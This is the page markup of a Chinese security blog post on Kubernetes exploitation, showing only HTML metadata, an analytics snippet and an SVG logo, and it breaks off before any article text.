<!DOCTYPE html>
<html lang="zh-CN" data-theme="dark">
    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
    <meta charset="UTF-8" />

    <meta name="generator" content="Hugo 0.109.0"><meta name="theme-color" content="#16171d" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
    
    <meta http-equiv="Cache-Control" content="no-transform" />
    
    <meta http-equiv="Cache-Control" content="no-siteapp" />

    <title>Kubernetes 实际利用与分析 | MYZXCG</title>

    <link rel="stylesheet" href="/css/meme.min.248ffc922f6c9975e8625f71e7ebc1a9e2180e744b9528665612bf7c124dea69.css"/>

    
    
        <script src="/js/meme.min.6d72b01d76c00f0b1e95d1e597afb2c3ca8bfbfe2c7fa68474010ae38dec477d.js"></script>

    

    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />

        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>

    <meta name="author" content="myzxcg" /><meta name="description" content="本文测试环境基于前文 - Kubernetes 环境搭建与基础知识 搭建的k8s集群： 一个master节点：1……" />

    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-title" content="MYZXCG" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
    <meta name="mobile-web-app-capable" content="yes" />
    <meta name="application-name" content="MYZXCG" />
    <meta name="msapplication-starturl" content="../../../" />
    <meta name="msapplication-TileColor" content="#603cba" />
    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
    <link rel="manifest" href="/manifest.json" />


    
    

    
    <link rel="canonical" href="https://myzxcg.com/2022/11/Kubernetes-%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/" />
    

<script type="application/ld+json">
    {
        "@context": "https://schema.org",
        "@type": "BlogPosting",
        "datePublished": "2022-11-29T16:22:59+08:00",
        "dateModified": "2022-12-01T21:48:25+08:00",
        "url": "https://myzxcg.com/2022/11/Kubernetes-%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/",
        "headline": "Kubernetes 实际利用与分析",
        "description": "本文测试环境基于前文 - Kubernetes 环境搭建与基础知识 搭建的k8s集群： 一个master节点：1……",
        "inLanguage" : "zh-CN",
        "articleSection": "posts",
        "wordCount":  7719 ,
        "image": ["https://myzxcg.com/images/16697105504486.jpg","https://myzxcg.com/images/16697106304584.jpg","https://myzxcg.com/images/16697106413433.jpg","https://myzxcg.com/images/16697106562380.jpg","https://myzxcg.com/images/16697106656348.jpg","https://myzxcg.com/images/16697106763754.jpg","https://myzxcg.com/images/16697106845757.jpg","https://myzxcg.com/images/16697107279887.jpg","https://myzxcg.com/images/16697107358664.jpg","https://myzxcg.com/images/16697107396244.jpg","https://myzxcg.com/images/16697107548420.jpg","https://myzxcg.com/images/16697107641592.jpg","https://myzxcg.com/images/16697107720396.jpg","https://myzxcg.com/images/16697108113955.jpg","https://myzxcg.com/images/16697108222569.jpg","https://myzxcg.com/images/16697108322728.jpg","https://myzxcg.com/images/16697108412517.jpg","https://myzxcg.com/images/16697108504636.jpg","https://myzxcg.com/images/16697108968121.jpg","https://myzxcg.com/images/16697109074036.jpg","https://myzxcg.com/images/16697109260710.jpg","https://myzxcg.com/images/16697109873117.jpg","https://myzxcg.com/images/16697109967376.jpg","https://myzxcg.com/images/16697110138725.jpg","https://myzxcg.com/images/16697110400635.jpg","https://myzxcg.com/images/16697110478584.jpg","https://myzxcg.com/images/16697110589829.jpg","https://myzxcg.com/images/16697110677507.jpg","https://myzxcg.com/images/16697110810243.jpg","https://myzxcg.com/images/16697111047464.jpg","https://myzxcg.com/images/16697111170189.jpg"],
        "author": {
            "@type": "Person",
            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
            "email": "myzx.xcg@gmail.com",
            "image": "https://myzxcg.com/avatar.png",
            "url": "https://myzxcg.com/",
            "name": "myzxcg"
        },
        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
        "publisher": {
            "@type": "Organization",
            "name": "MYZXCG",
            "logo": {
                "@type": "ImageObject",
                "url": "https://myzxcg.com/icons/favicon.ico"
            },
            "url": "https://myzxcg.com/"
        },
        "mainEntityOfPage": {
            "@type": "WebSite",
            "@id": "https://myzxcg.com/"
        }
    }
</script>

    

<meta name="twitter:card" content="summary_large_image" />


<meta name="twitter:site" content="@myzxcg" />
<meta name="twitter:creator" content="@myzxcg" />

    



<meta property="og:title" content="Kubernetes 实际利用与分析" />
<meta property="og:description" content="本文测试环境基于前文 - Kubernetes 环境搭建与基础知识 搭建的k8s集群： 一个master节点：1……" />
<meta property="og:url" content="https://myzxcg.com/2022/11/Kubernetes-%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%86%E6%9E%90/" />
<meta property="og:site_name" content="MYZXCG" />
<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/16697105504486.jpg" />
<meta property="og:type" content="article" />
    <meta property="article:published_time" content="2022-11-29T16:22:59&#43;08:00" />
    <meta property="article:modified_time" content="2022-12-01T21:48:25&#43;08:00" />
    
    <meta property="article:section" content="posts" />


        <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />

        


    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0LZRMN44V"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-Y0LZRMN44V');
    </script>




    
    

    
</head>

    <body>
        <div class="container">
            
    <header class="header">
        
            <div class="header-wrapper">
                <div class="header-inner single">
                    
    <div class="site-brand">
        
            <a href="/"><svg data-v-423bf9ae="" xmlns="http://www.w3.org/2000/svg" class="brand" viewBox="0 0 164.20314694661778 60" class="font"><!----><defs data-v-423bf9ae=""><linearGradient data-v-423bf9ae="" gradientTransform="rotate(25)" id="9d5bfb87-9af0-4056-b335-e722243993f9" x1="0%" y1="0%" x2="100%" y2="0%"><stop data-v-423bf9ae="" offset="0%" style="stop-color: rgb(87, 93, 96); stop-opacity: 1;"></stop><stop data-v-423bf9ae="" offset="100%" style="stop-color: rgb(246, 225, 205); stop-opacity: 1;"></stop></linearGradient></defs><!----><g data-v-423bf9ae="" id="2fa46697-71c2-43ec-b51a-6d9e651e9e88" fill="#ffffff" transform="matrix(4.687500279396789,0,0,4.687500279396789,-2.1562506803318087,-24.703126859851267)"><path d="M7.24 13.04L7.24 13.04L7.24 13.04Q7.26 13.09 7.27 13.13L7.27 13.13L7.27 13.13Q7.28 13.16 7.28 13.19L7.28 13.19L7.28 13.19Q7.28 13.25 7.23 13.27L7.23 13.27L7.23 13.27Q7.18 13.28 7.12 13.29L7.12 13.29L7.12 13.29Q7.11 13.30 7.10 13.35L7.10 13.35L7.10 13.35Q7.08 13.41 7.06 13.48L7.06 13.48L7.06 13.48Q7.03 13.55 6.98 13.60L6.98 13.60L6.98 13.60Q6.93 13.66 6.84 13.66L6.84 13.66L6.84 13.66Q6.56 13.64 6.39 13.53L6.39 13.53L6.39 13.53Q6.23 13.43 6.15 13.24L6.15 13.24L6.15 13.24Q6.06 13.06 6.04 12.80L6.04 12.80L6.04 12.80Q6.02 12.54 6.02 12.23L6.02 12.23L6.02 12.23Q6.02 11.86 6.05 11.46L6.05 11.46L6.05 11.46Q6.08 11.05 6.13 10.67L6.13 10.67L6.13 10.67Q6.17 10.29 6.20 9.95L6.20 9.95L6.20 9.95Q6.23 9.61 6.23 9.37L6.23 9.37L6.23 9.37Q6.23 9.02 6.17 8.83L6.17 8.83L6.17 8.83Q6.11 8.64 6.01 8.64L6.01 8.64L6.01 8.64Q5.96 8.64 5.76 8.92L5.76 8.92L5.76 8.92Q5.56 9.21 5.29 9.78L5.29 9.78L5.29 9.78Q5.01 10.36 4.69 11.22L4.69 11.22L4.69 11.22Q4.38 12.09 4.09 13.26L4.09 13.26L4.09 13.26Q4.07 13.31 4.07 13.36L4.07 13.36L4.07 13.36Q4.07 13.42 4.07 13.46L4.07 13.46L4.07 13.46Q4.06 13.51 4.04 13.54L4.04 13.54L4.04 13.54Q4.01 13.57 3.96 13.57L3.96 13.57L3.96 13.57Q3.87 13.57 3.81 13.53L3.81 13.53L3.81 13.53Q3.76 13.49 3.72 13.45L3.72 13.45L3.72 13.45Q3.68 13.41 3.64 13.37L3.64 13.37L3.64 13.37Q3.61 13.33 3.55 13.33L3.55 13.33L3.55 13.33Q3.53 13.33 3.52 13.36L3.52 13.36L3.52 13.36Q3.51 13.38 3.49 13.42L3.49 13.42L3.49 13.42Q3.47 13.46 3.44 13.49L3.44 13.49L3.44 13.49Q3.41 13.51 3.36 13.51L3.36 13.51L3.36 13.51Q3.32 13.51 3.27 13.50L3.27 13.50L3.27 13.50Q3.23 13.48 3.18 13.41L3.18 13.41L3.18 13.41Q3.13 13.34 3.10 13.20L3.10 13.20L3.10 13.20Q3.07 13.06 3.07 12.82L3.07 12.82L3.07 12.51L3.07 12.51Q3.07 12.41 3.09 12.21L3.09 12.21L3.09 12.21Q3.11 12.01 3.13 11.74L3.13 11.74L3.13 11.74Q3.16 11.48 3.19 11.17L3.19 11.17L3.19 11.17Q3.22 10.86 3.24 10.53L3.24 10.53L3.24 10.53Q3.27 10.21 3.28 9.91L3.28 9.91L3.28 9.91Q3.30 9.60 3.30 9.34L3.30 9.34L3.30 9.34Q3.30 8.57 3.11 8.57L3.11 8.57L3.11 8.57Q3.06 8.57 3.00 8.61L3.00 8.61L3.00 8.61Q2.94 8.64 2.85 8.75L2.85 8.75L2.85 8.75Q2.77 8.85 2.66 9.05L2.66 9.05L2.66 9.05Q2.54 9.24 2.40 9.57L2.40 9.57L2.40 9.57Q2.26 9.89 2.08 10.36L2.08 10.36L2.08 10.36Q1.90 10.83 1.68 11.48L1.68 11.48L1.68 11.48Q1.63 11.63 1.58 11.90L1.58 11.90L1.58 11.90Q1.52 12.18 1.47 12.47L1.47 12.47L1.47 12.47Q1.42 12.76 1.39 13.00L1.39 13.00L1.39 13.00Q1.36 13.24 1.36 13.32L1.36 13.32L1.36 13.32Q1.36 13.34 1.29 13.38L1.29 13.38L1.29 13.38Q1.22 13.43 1.12 13.47L1.12 13.47L1.12 13.47Q1.03 13.51 0.93 13.54L0.93 13.54L0.93 13.54Q0.83 13.57 0.77 13.57L0.77 13.57L0.77 13.57Q0.66 13.57 0.59 13.50L0.59 13.50L0.59 13.50Q0.53 13.44 0.50 13.27L0.50 13.27L0.50 13.27Q0.47 13.09 0.47 12.79L0.47 12.79L0.47 12.79Q0.46 12.48 0.46 12.00L0.46 12.00L0.46 12.00Q0.46 11.88 0.48 11.52L0.48 11.52L0.48 11.52Q0.49 11.16 0.51 10.68L0.51 10.68L0.51 10.68Q0.54 10.21 0.58 9.70L0.58 9.70L0.58 9.70Q0.62 9.18 0.68 8.75L0.68 8.75L0.68 8.75Q0.73 8.32 0.81 8.04L0.81 8.04L0.81 8.04Q0.88 7.76 0.98 7.76L0.98 7.76L0.98 7.76Q1.03 7.76 1.07 7.79L1.07 7.79L1.07 7.79Q1.11 7.83 1.14 7.86L1.14 7.86L1.14 7.86Q1.18 7.90 1.21 7.94L1.21 7.94L1.21 7.94Q1.24 7.97 1.27 7.97L1.27 7.97L1.27 7.97Q1.30 7.97 1.33 7.94L1.33 7.94L1.33 7.94Q1.36 7.92 1.38 7.88L1.38 7.88L1.38 7.88Q1.41 7.84 1.43 7.81L1.43 7.81L1.43 7.81Q1.46 7.79 1.47 7.79L1.47 7.79L1.47 7.79Q1.49 7.79 1.53 7.85L1.53 7.85L1.53 7.85Q1.57 7.92 1.61 8.02L1.61 8.02L1.61 8.02Q1.65 8.11 1.68 8.21L1.68 8.21L1.68 8.21Q1.71 8.31 1.71 8.36L1.71 8.36L1.71 8.36Q1.71 8.50 1.69 8.75L1.69 8.75L1.69 8.75Q1.66 9.00 1.63 9.31L1.63 9.31L1.63 9.31Q1.60 9.61 1.58 9.93L1.58 9.93L1.58 9.93Q1.55 10.24 1.55 10.51L1.55 10.51L1.55 10.53L1.55 10.53Q1.64 10.24 1.76 9.93L1.76 9.93L1.76 9.93Q1.88 9.62 2.02 9.32L2.02 9.32L2.02 9.32Q2.17 9.02 2.33 8.76L2.33 8.76L2.33 8.76Q2.49 8.49 2.67 8.29L2.67 8.29L2.67 8.29Q2.84 8.09 3.03 7.98L3.03 7.98L3.03 7.98Q3.21 7.86 3.40 7.86L3.40 7.86L3.40 7.86Q3.64 7.86 3.80 7.94L3.80 7.94L3.80 7.94Q3.97 8.02 4.07 8.16L4.07 8.16L4.07 8.16Q4.18 8.30 4.22 8.48L4.22 8.48L4.22 8.48Q4.27 8.66 4.27 8.87L4.27 8.87L4.27 8.87Q4.27 9.04 4.25 9.28L4.25 9.28L4.25 9.28Q4.22 9.51 4.20 9.79L4.20 9.79L4.20 9.79Q4.17 10.08 4.15 10.41L4.15 10.41L4.15 10.41Q4.12 10.75 4.12 11.15L4.12 11.15L4.12 11.15Q4.20 10.90 4.33 10.56L4.33 10.56L4.33 10.56Q4.46 10.21 4.61 9.84L4.61 9.84L4.61 9.84Q4.76 9.47 4.94 9.11L4.94 9.11L4.94 9.11Q5.11 8.75 5.29 8.46L5.29 8.46L5.29 8.46Q5.47 8.18 5.65 8.00L5.65 8.00L5.65 8.00Q5.83 7.82 6.00 7.82L6.00 7.82L6.00 7.82Q6.04 7.82 6.21 7.85L6.21 7.85L6.21 7.85Q6.38 7.88 6.57 7.94L6.57 7.94L6.57 7.94Q6.75 8.00 6.92 8.08L6.92 8.08L6.92 8.08Q7.08 8.17 7.14 8.28L7.14 8.28L7.14 8.28Q7.19 8.39 7.24 8.60L7.24 8.60L7.24 8.60Q7.28 8.81 7.28 9.16L7.28 9.16L7.28 9.16Q7.28 9.47 7.24 9.90L7.24 9.90L7.24 9.90Q7.19 10.32 7.08 10.92L7.08 10.92L7.08 10.92Q7.05 11.12 7.04 11.31L7.04 11.31L7.04 11.31Q7.03 11.49 7.03 11.67L7.03 11.67L7.03 11.67Q7.03 11.93 7.05 12.15L7.05 12.15L7.05 12.15Q7.08 12.38 7.11 12.56L7.11 12.56L7.11 12.56Q7.14 12.74 7.18 12.86L7.18 12.86L7.18 12.86Q7.21 12.99 7.24 13.04ZM13.92 7.93L13.92 7.93L13.92 7.93Q13.90 7.96 13.78 8.16L13.78 8.16L13.78 8.16Q13.66 8.35 13.47 8.65L13.47 8.65L13.47 8.65Q13.29 8.95 13.05 9.33L13.05 9.33L13.05 9.33Q12.82 9.71 12.57 10.11L12.57 10.11L12.57 10.11Q12.32 10.52 12.07 10.92L12.07 10.92L12.07 10.92Q11.83 11.33 11.61 11.68L11.61 11.68L11.61 11.68Q11.40 12.03 11.24 12.30L11.24 12.30L11.24 12.30Q11.08 12.58 11.01 12.71L11.01 12.71L11.01 12.71Q10.93 12.85 10.79 13.14L10.79 13.14L10.79 13.14Q10.66 13.43 10.48 13.80L10.48 13.80L10.48 13.80Q10.30 14.17 10.10 14.60L10.10 14.60L10.10 14.60Q9.90 15.03 9.70 15.47L9.70 15.47L9.70 15.47Q9.50 15.90 9.31 16.31L9.31 16.31L9.31 16.31Q9.12 16.71 8.97 17.04L8.97 17.04L8.97 17.04Q8.83 17.36 8.73 17.56L8.73 17.56L8.73 17.56Q8.63 17.77 8.62 17.81L8.62 17.81L8.62 17.81Q8.56 17.97 8.51 18.01L8.51 18.01L8.51 18.01Q8.46 18.05 8.36 18.07L8.36 18.07L8.36 18.07Q8.31 18.07 8.29 18.04L8.29 18.04L8.29 18.04Q8.26 18.01 8.24 17.96L8.24 17.96L8.24 17.96Q8.22 17.91 8.20 17.87L8.20 17.87L8.20 17.87Q8.18 17.83 8.15 17.83L8.15 17.83L8.15 17.83Q8.06 17.81 8.05 17.79L8.05 17.79L8.05 17.79Q8.04 17.77 8.00 17.70L8.00 17.70L8.00 17.70Q7.98 17.67 7.96 17.67L7.96 17.67L7.96 17.67Q7.94 17.66 7.92 17.66L7.92 17.66L7.92 17.66Q7.90 17.66 7.89 17.66L7.89 17.66L7.89 17.66Q7.88 17.65 7.88 17.62L7.88 17.62L7.88 17.62Q7.90 17.50 7.91 17.38L7.91 17.38L7.91 17.38Q7.92 17.27 7.94 17.17L7.94 17.17L7.94 17.17Q7.96 17.10 8.08 16.86L8.08 16.86L8.08 16.86Q8.20 16.62 8.37 16.27L8.37 16.27L8.37 16.27Q8.55 15.93 8.77 15.51L8.77 15.51L8.77 15.51Q9.00 15.09 9.23 14.65L9.23 14.65L9.23 14.65Q9.45 14.22 9.68 13.79L9.68 13.79L9.68 13.79Q9.90 13.37 10.08 13.02L10.08 13.02L10.08 13.02Q9.99 12.83 9.84 12.53L9.84 12.53L9.84 12.53Q9.69 12.22 9.51 11.85L9.51 11.85L9.51 11.85Q9.33 11.48 9.13 11.06L9.13 11.06L9.13 11.06Q8.93 10.64 8.74 10.23L8.74 10.23L8.74 10.23Q8.54 9.82 8.37 9.44L8.37 9.44L8.37 9.44Q8.19 9.06 8.06 8.75L8.06 8.75L8.06 8.75Q7.92 8.45 7.85 8.25L7.85 8.25L7.85 8.25Q7.77 8.05 7.77 8.00L7.77 8.00L7.77 8.00Q7.78 7.92 7.81 7.89L7.81 7.89L7.81 7.89Q7.83 7.85 7.88 7.85L7.88 7.85L7.88 7.85Q7.92 7.85 7.97 7.88L7.97 7.88L7.97 7.88Q8.03 7.90 8.08 7.92L8.08 7.92L8.08 7.92Q8.16 7.95 8.24 7.98L8.24 7.98L8.24 7.98Q8.31 8.01 8.35 7.96L8.35 7.96L8.35 7.96Q8.37 7.90 8.46 7.90L8.46 7.90L8.46 7.90Q8.56 7.90 8.62 7.93L8.62 7.93L8.62 7.93Q8.64 7.95 8.66 7.94L8.66 7.94L8.66 7.94Q8.67 7.94 8.69 7.92L8.69 7.92L8.69 7.92Q8.71 7.90 8.73 7.87L8.73 7.87L8.73 7.87Q8.76 7.85 8.79 7.83L8.79 7.83L8.79 7.83Q8.87 7.82 8.93 7.86L8.93 7.86L8.93 7.86Q8.99 7.90 9.04 8.04L9.04 8.04L9.04 8.04Q9.08 8.14 9.18 8.39L9.18 8.39L9.18 8.39Q9.29 8.65 9.44 8.98L9.44 8.98L9.44 8.98Q9.58 9.32 9.76 9.70L9.76 9.70L9.76 9.70Q9.94 10.09 10.12 10.46L10.12 10.46L10.12 10.46Q10.29 10.83 10.46 11.16L10.46 11.16L10.46 11.16Q10.62 11.49 10.74 11.71L10.74 11.71L10.74 11.71Q10.92 11.37 11.14 10.98L11.14 10.98L11.14 10.98Q11.35 10.60 11.58 10.21L11.58 10.21L11.58 10.21Q11.80 9.82 12.02 9.45L12.02 9.45L12.02 9.45Q12.24 9.08 12.43 8.77L12.43 8.77L12.43 8.77Q12.63 8.46 12.78 8.22L12.78 8.22L12.78 8.22Q12.93 7.98 13.02 7.86L13.02 7.86L13.02 7.86Q13.08 7.79 13.08 7.77L13.08 7.77L13.08 7.77Q13.08 7.75 13.13 7.73L13.13 7.73L13.13 7.73Q13.17 7.72 13.20 7.70L13.20 7.70L13.20 7.70Q13.23 7.69 13.30 7.70L13.30 7.70L13.30 7.70Q13.36 7.72 13.40 7.72L13.40 7.72L13.40 7.72Q13.43 7.72 13.45 7.76L13.45 7.76L13.45 7.76Q13.47 7.78 13.49 7.77L13.49 7.77L13.49 7.77Q13.52 7.77 13.56 7.75L13.56 7.75L13.56 7.75Q13.60 7.73 13.64 7.71L13.64 7.71L13.64 7.71Q13.68 7.70 13.72 7.70L13.72 7.70L13.72 7.70Q13.77 7.71 13.82 7.72L13.82 7.72L13.82 7.72Q13.86 7.73 13.90 7.76L13.90 7.76L13.90 7.76Q13.94 7.79 13.95 7.83L13.95 7.83L13.95 7.83Q13.95 7.87 13.92 7.93ZM18.94 8.25L18.94 8.25L18.94 8.25Q18.92 8.29 18.90 8.31L18.90 8.31L18.90 8.31Q18.89 8.33 18.86 8.35L18.86 8.35L18.86 8.35Q18.83 8.37 18.79 8.40L18.79 8.40L18.79 8.40Q18.75 8.44 18.69 8.49L18.69 8.49L18.69 8.49Q18.57 8.58 18.30 8.83L18.30 8.83L18.30 8.83Q18.03 9.08 17.66 9.43L17.66 9.43L17.66 9.43Q17.30 9.78 16.89 10.19L16.89 10.19L16.89 10.19Q16.47 10.60 16.08 11.02L16.08 11.02L16.08 11.02Q15.68 11.43 15.34 11.81L15.34 11.81L15.34 11.81Q15.00 12.18 14.78 12.46L14.78 12.46L14.78 12.46Q15.05 12.41 15.41 12.37L15.41 12.37L15.41 12.37Q15.77 12.32 16.15 12.29L16.15 12.29L16.15 12.29Q16.54 12.26 16.92 12.24L16.92 12.24L16.92 12.24Q17.29 12.22 17.61 12.22L17.61 12.22L17.61 12.22Q18.03 12.22 18.25 12.26L18.25 12.26L18.25 12.26Q18.37 12.27 18.45 12.34L18.45 12.34L18.45 12.34Q18.54 12.40 18.60 12.48L18.60 12.48L18.60 12.48Q18.66 12.55 18.69 12.63L18.69 12.63L18.69 12.63Q18.72 12.70 18.72 12.74L18.72 12.74L18.72 12.74Q18.72 12.80 18.72 12.86L18.72 12.86L18.72 12.86Q18.73 12.91 18.72 12.96L18.72 12.96L18.72 12.96Q18.71 13.01 18.67 13.05L18.67 13.05L18.67 13.05Q18.63 13.09 18.53 13.11L18.53 13.11L18.53 13.11Q18.48 13.13 18.41 13.11L18.41 13.11L18.41 13.11Q18.33 13.10 18.27 13.08L18.27 13.08L18.27 13.08Q18.20 13.07 18.14 13.06L18.14 13.06L18.14 13.06Q18.08 13.06 18.06 13.08L18.06 13.08L18.06 13.08Q17.99 13.18 18.03 13.25L18.03 13.25L18.03 13.25Q18.07 13.32 18.17 13.41L18.17 13.41L18.17 13.41Q18.22 13.44 18.20 13.48L18.20 13.48L18.20 13.48Q18.18 13.53 18.10 13.56L18.10 13.56L18.10 13.56Q18.03 13.58 17.91 13.58L17.91 13.58L17.91 13.58Q17.79 13.58 17.65 13.54L17.65 13.54L17.65 13.54Q17.59 13.52 17.44 13.51L17.44 13.51L17.44 13.51Q17.29 13.49 17.09 13.48L17.09 13.48L17.09 13.48Q16.89 13.47 16.64 13.47L16.64 13.47L16.64 13.47Q16.39 13.46 16.13 13.46L16.13 13.46L16.13 13.46Q15.78 13.46 15.43 13.47L15.43 13.47L15.43 13.47Q15.08 13.48 14.77 13.50L14.77 13.50L14.77 13.50Q14.46 13.52 14.23 13.56L14.23 13.56L14.23 13.56Q13.99 13.59 13.87 13.64L13.87 13.64L13.87 13.64Q13.73 13.71 13.66 13.70L13.66 13.70L13.66 13.70Q13.59 13.69 13.51 13.61L13.51 13.61L13.51 13.61Q13.47 13.57 13.44 13.52L13.44 13.52L13.44 13.52Q13.40 13.48 13.38 13.44L13.38 13.44L13.38 13.44Q13.36 13.40 13.38 13.36L13.38 13.36L13.38 13.36Q13.40 13.32 13.47 13.30L13.47 13.30L13.47 13.30Q13.53 13.29 13.53 13.25L13.53 13.25L13.53 13.25Q13.54 13.21 13.51 13.17L13.51 13.17L13.51 13.17Q13.49 13.13 13.47 13.09L13.47 13.09L13.47 13.09Q13.44 13.04 13.44 13.01L13.44 13.01L13.44 13.01Q13.45 12.95 13.63 12.72L13.63 12.72L13.63 12.72Q13.82 12.49 14.13 12.15L14.13 12.15L14.13 12.15Q14.44 11.81 14.85 11.39L14.85 11.39L14.85 11.39Q15.26 10.97 15.70 10.53L15.70 10.53L15.70 10.53Q16.14 10.08 16.58 9.64L16.58 9.64L16.58 9.64Q17.03 9.19 17.42 8.81L17.42 8.81L17.42 8.81Q17.23 8.79 16.96 8.78L16.96 8.78L16.96 8.78Q16.69 8.77 16.39 8.77L16.39 8.77L16.39 8.77Q16.13 8.77 15.87 8.78L15.87 8.78L15.87 8.78Q15.61 8.78 15.38 8.79L15.38 8.79L15.38 8.79Q15.15 8.80 14.97 8.82L14.97 8.82L14.97 8.82Q14.80 8.83 14.71 8.84L14.71 8.84L14.71 8.84Q14.62 8.85 14.57 8.84L14.57 8.84L14.57 8.84Q14.53 8.83 14.52 8.81L14.52 8.81L14.52 8.81Q14.51 8.78 14.50 8.75L14.50 8.75L14.50 8.75Q14.50 8.72 14.49 8.70L14.49 8.70L14.49 8.70Q14.46 8.68 14.43 8.66L14.43 8.66L14.43 8.66Q14.40 8.64 14.38 8.61L14.38 8.61L14.38 8.61Q14.36 8.59 14.36 8.56L14.36 8.56L14.36 8.56Q14.35 8.52 14.38 8.49L14.38 8.49L14.38 8.49Q14.40 8.46 14.39 8.44L14.39 8.44L14.39 8.44Q14.37 8.42 14.34 8.40L14.34 8.40L14.34 8.40Q14.31 8.39 14.29 8.36L14.29 8.36L14.29 8.36Q14.26 8.33 14.26 8.29L14.26 8.29L14.26 8.29Q14.26 8.22 14.26 8.15L14.26 8.15L14.26 8.15Q14.27 8.08 14.32 8.07L14.32 8.07L14.32 8.07Q14.38 8.05 14.38 8.00L14.38 8.00L14.38 8.00Q14.39 7.94 14.49 7.89L14.49 7.89L14.49 7.89Q14.57 7.83 14.76 7.80L14.76 7.80L14.76 7.80Q14.94 7.77 15.19 7.75L15.19 7.75L15.19 7.75Q15.44 7.73 15.74 7.72L15.74 7.72L15.74 7.72Q16.04 7.72 16.37 7.72L16.37 7.72L16.37 7.72Q16.69 7.72 17.01 7.72L17.01 7.72L17.01 7.72Q17.34 7.72 17.63 7.73L17.63 7.73L17.63 7.73Q17.93 7.74 18.19 7.74L18.19 7.74L18.19 7.74Q18.44 7.75 18.63 7.75L18.63 7.75L18.63 7.75Q18.69 7.75 18.76 7.80L18.76 7.80L18.76 7.80Q18.83 7.85 18.88 7.93L18.88 7.93L18.88 7.93Q18.94 8.00 18.96 8.09L18.96 8.09L18.96 8.09Q18.98 8.18 18.94 8.25ZM23.63 13.04L23.63 13.04L23.63 13.04Q23.68 13.10 23.67 13.16L23.67 13.16L23.67 13.16Q23.65 13.22 23.61 13.27L23.61 13.27L23.61 13.27Q23.57 13.32 23.51 13.34L23.51 13.34L23.51 13.34Q23.45 13.36 23.41 13.34L23.41 13.34L23.41 13.34Q23.31 13.32 23.20 13.36L23.20 13.36L23.20 13.36Q23.10 13.40 23.06 13.43L23.06 13.43L23.06 13.43Q23.02 13.47 23.04 13.52L23.04 13.52L23.04 13.52Q23.06 13.57 23.10 13.62L23.10 13.62L23.10 13.62Q23.15 13.69 23.11 13.77L23.11 13.77L23.11 13.77Q23.06 13.85 22.96 13.84L22.96 13.84L22.96 13.84Q22.92 13.84 22.81 13.71L22.81 13.71L22.81 13.71Q22.70 13.58 22.54 13.38L22.54 13.38L22.54 13.38Q22.39 13.19 22.21 12.93L22.21 12.93L22.21 12.93Q22.03 12.67 21.85 12.41L21.85 12.41L21.85 12.41Q21.67 12.15 21.50 11.89L21.50 11.89L21.50 11.89Q21.33 11.64 21.21 11.44L21.21 11.44L21.21 11.44Q21.06 11.63 20.87 11.85L20.87 11.85L20.87 11.85Q20.69 12.07 20.50 12.30L20.50 12.30L20.50 12.30Q20.31 12.53 20.13 12.75L20.13 12.75L20.13 12.75Q19.95 12.96 19.80 13.13L19.80 13.13L19.80 13.13Q19.66 13.30 19.56 13.40L19.56 13.40L19.56 13.40Q19.47 13.51 19.45 13.51L19.45 13.51L19.45 13.51Q19.37 13.56 19.32 13.62L19.32 13.62L19.32 13.62Q19.27 13.69 19.17 13.71L19.17 13.71L19.17 13.71Q19.12 13.72 19.08 13.70L19.08 13.70L19.08 13.70Q19.04 13.69 19.01 13.66L19.01 13.66L19.01 13.66Q18.98 13.64 18.94 13.62L18.94 13.62L18.94 13.62Q18.91 13.60 18.87 13.61L18.87 13.61L18.87 13.61Q18.81 13.61 18.77 13.50L18.77 13.50L18.77 13.50Q18.74 13.40 18.83 13.26L18.83 13.26L18.83 13.26Q18.84 13.25 18.94 13.12L18.94 13.12L18.94 13.12Q19.04 13.00 19.21 12.79L19.21 12.79L19.21 12.79Q19.37 12.59 19.57 12.34L19.57 12.34L19.57 12.34Q19.78 12.09 20.00 11.82L20.00 11.82L20.00 11.82Q20.21 11.56 20.43 11.31L20.43 11.31L20.43 11.31Q20.64 11.05 20.82 10.86L20.82 10.86L20.82 10.86Q20.60 10.55 20.35 10.17L20.35 10.17L20.35 10.17Q20.10 9.78 19.86 9.43L19.86 9.43L19.86 9.43Q19.62 9.08 19.43 8.81L19.43 8.81L19.43 8.81Q19.24 8.54 19.17 8.46L19.17 8.46L19.17 8.46Q19.09 8.39 19.05 8.33L19.05 8.33L19.05 8.33Q19.02 8.27 19.01 8.23L19.01 8.23L19.01 8.23Q19.00 8.19 19.07 8.18L19.07 8.18L19.07 8.18Q19.10 8.18 19.11 8.15L19.11 8.15L19.11 8.15Q19.12 8.11 19.13 8.08L19.13 8.08L19.13 8.08Q19.14 